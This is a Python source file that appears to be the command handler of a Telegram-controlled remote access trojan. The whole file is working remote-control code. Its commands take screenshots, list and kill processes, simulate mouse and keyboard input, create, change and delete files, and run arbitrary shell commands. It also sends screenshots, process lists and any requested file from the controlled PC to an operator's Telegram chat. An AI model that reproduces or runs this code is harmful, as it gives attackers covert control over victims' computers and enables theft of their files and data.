import telebot
import os
from socket import gethostbyname
from subprocess import Popen

import pyautogui
from psutil import process_iter, Process
from keyboard import write
from webbrowser import open as web

help = """Guide:

/name | show all conected pcs

/directory | show current directory 
<current_directory>
/files | show files in current directory 
<files_in_current_directory>
/screen | send screenshot 
<screen_shot>
/system | send system data 
<system_data>
/processes | send system processes 
<show_system_processes>

/mouse [x] [y] | move mouse cursor 
<move_mouse> 
/click | lmb click 
<click_mouse>
/keyboard [data] | imitate keyboard input 
<keyboard_input>

/cd [path] | go to another directory 
<cd>
/createfold [name] | create folder 
<create_folder>
/createfile [name] [data] | create file with data inside 
<create_file>
/writefile [name] [data] | add text to file 
<write_to_file>
/remove [name] | remove file, folder or directory 
<remove(folder or file)>
/rename [oldname] [newname] | rename file or folder 
<rename(folder or file)>

/start [firstParam] [secondParam] | starts anything in cmd 
<start_process>
/kill [pid] | kills process by pid 
<kill_process>
/web [https] | opens the webpage 
<open_web_page>

/download [filename] | downloads file from pc 
<send_file>

to send file to pc you need to drop it in chat.
"""

def command_parse(command, chatid, token):
    bot = telebot.TeleBot(token)
    
    myname = os.getlogin()

    def current_directory():
        res = ''
        dir = os.getcwd().split('\\')
        for i in range(len(dir)):
            res += f'{" " * i}↵{dir[i]}\n'
        return f'[{myname}] \n{res}'
    
    def files_in_current_directory():
        res = ''
        dir = os.listdir()
        for i in dir:
            if i == len(dir)-1:
                res += i
                break
            res += i + '\n'
        return f'[{myname}] \n{res}'
    
    def screen_shot():
        screen = pyautogui.screenshot('screenshot.png')
        file = open('screenshot.png', 'rb')
        bot.send_document(chatid, file)
        file.close()
        os.remove('screenshot.png')
    
    def system_data():
        res = f'[{myname}]\n'
        res += gethostbyname("www.goole.com")
        width, height = pyautogui.size()
        res += f'\n{width}x{height}'
        return f'[{myname}] \n{res}'
    
    def show_system_processes():
        process = ''
        for proc in process_iter(['pid', 'name']):
            toadd = str(proc.info).split(' ')
            xd = f'Pid:{toadd[1][1::][::-1][2::][::-1]} {toadd[3][::-1][1::][::-1]}'
            process += xd + '\n'
            
        with open('processes.txt', 'w+') as file:
            file.write(process)
        
        file = open('processes.txt', 'rb')
        bot.send_document(chatid, file)
        file.close()
        os.remove('processes.txt')

    def move_mouse(x, y):
        pyautogui.moveTo(int(x), int(y), 0.25)
        return f'[{myname}] move_mouse completed'
    
    def click_mouse():
        pyautogui.click()
        return f'[{myname}] click_mouse completed'
    
    def keyboard_input(data):
        write(data) 
        return f'[{myname}] keyboard_input completed'
    
    def cd(data):
        os.chdir(data)
        return f'[{myname}] cd completed'
    
    def create_folder(name):
        os.mkdir(name)
        return f'[{myname}] create_folder completed'
    
    def create_file(name, towrite):
        with open(name, 'w+') as file:
            file.write(towrite)
        return f'[{myname}] create_file completed'
    
    def write_to_file(name, towrite):
        with open(name, 'a') as file:
            file.write(towrite)
        return f'[{myname}] write_to_file completed'
    
    def remove(name):
        try:
            os.remove(name)
        except FileNotFoundError:
            os.rmdir(name)
        return f'[{myname}] remove completed'
    
    def rename(oldname, newname):
        os.rename(oldname, newname)
        return f'[{myname}] rename completed'
    
    def start_process(fparam, sparam):
        Popen((fparam, f'{sparam}'), shell=True)
        return f'[{myname}] start_process completed'
    
    def kill_process(pid):
        process = Process(int(pid))
        process.kill()
        return f'[{myname}] kill_process completed'
    
    def open_web_page(https):
        web(https, new=2)
        return f'[{myname}] open_web_page completed'
    
    def send_file(filename):
        file = open(filename, 'rb')
        bot.send_document(chatid, file)
        file.close()
        

    if 'directory' in command:
        bot.send_message(chatid, current_directory())
    elif 'files' in command:
        bot.send_message(chatid, files_in_current_directory())
    elif 'screen' in command:
        screen_shot()
    elif 'system' in command:
        bot.send_message(chatid, system_data())
    elif 'processes' in command:
        show_system_processes()
    elif 'mouse' in command:
        bot.send_message(chatid, move_mouse(command.split(' ')[1], command.split(' ')[2]))
    elif 'click' in command:
        bot.send_message(chatid, click_mouse())
    elif 'keyboard' in command:
        data = ''
        xd = command.split(' ')
        xd.pop(0)
        for i in xd:
            data += i + ' '

        bot.send_message(chatid, keyboard_input(data)) 
    elif 'cd' in command:
        data = ''
        xd = command.split(' ')
        xd.pop(0)
        for i in xd:
            data += i + ' ' 
        bot.send_message(chatid, cd(data[::-1][1::][::-1]))
    elif 'createfold' in command:
        data = ''
        xd = command.split(' ')
        xd.pop(0)
        for i in xd:
            data += i + ' '  
        bot.send_message(chatid, create_folder(data[::-1][1::][::-1])) 
    elif 'createfile' in command:
        bot.send_message(chatid, create_file(command.split(' ')[1], command.split(' ')[2])) 
    elif 'writefile' in command:
        bot.send_message(chatid, write_to_file(command.split(' ')[1], command.split(' ')[2]))
    elif 'remove' in command:
        bot.send_message(chatid, remove(command.split(' ')[1]))
    elif 'rename' in command:
        bot.send_message(chatid, rename(command.split(' ')[1], command.split(' ')[2]))
    elif 'start' in command:
        bot.send_message(chatid, start_process(command.split(' ')[1], command.split(' ')[2]))
    elif 'kill' in command:
        bot.send_message(chatid, kill_process(command.split(' ')[1]))
    elif 'web' in command:
        bot.send_message(chatid, open_web_page(command.split(' ')[1]))
    elif 'download' in command:
        send_file(command.split(' ')[1])